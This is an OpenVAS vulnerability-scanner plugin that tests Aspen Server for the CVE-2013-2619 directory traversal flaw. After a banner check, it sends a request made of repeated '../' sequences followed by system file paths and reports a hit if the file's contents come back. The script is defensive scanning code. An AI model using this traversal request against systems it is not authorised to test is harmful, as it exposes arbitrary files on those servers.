##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_aspen_server_dir_trav_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# Aspen Sever Directory Traversal Vulnerability
#
# Authors:
# Arun Kallavi <karun@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803367");
  script_version("$Revision: 7577 $");
  script_cve_id("CVE-2013-2619");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2013-04-04 12:47:57 +0530 (Thu, 04 Apr 2013)");
  script_name("Aspen Sever Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/24915");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121035");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/aspen-08-directory-traversal");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("Aspen/banner");

  script_tag(name:"insight", value:"The flaw is due to the program not properly sanitizing user supplied input.");
  script_tag(name:"solution", value:"Upgrade to Aspen Server 0.22 or later,
  For updates refer to http://aspen.io");
  script_tag(name:"summary", value:"This host is running Aspen Server and is prone to directory
  traversal vulnerability.");
  script_tag(name:"impact", value:"Successful exploitation will allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.

  Impact Level: Application");
  script_tag(name:"affected", value:"Aspen Server version 0.8 and prior");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
port = "";
files = "";
banner = "";

## Get HTTP Port
port = get_http_port(default:8080);

## Get the banner and confirm the application
banner = get_http_banner(port:port);

if("Server: Aspen" >< banner)
{
  files = traversal_files();

  foreach file (keys(files))
  {
    ## Construct directory traversal attack
    url = "/" + crap(data:"../",length:15) + files[file];

    ## Confirm exploit worked properly or not
    if(http_vuln_check(port:port, url:url, pattern:file))
    {
      report = report_vuln_url( port:port, url:url );
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
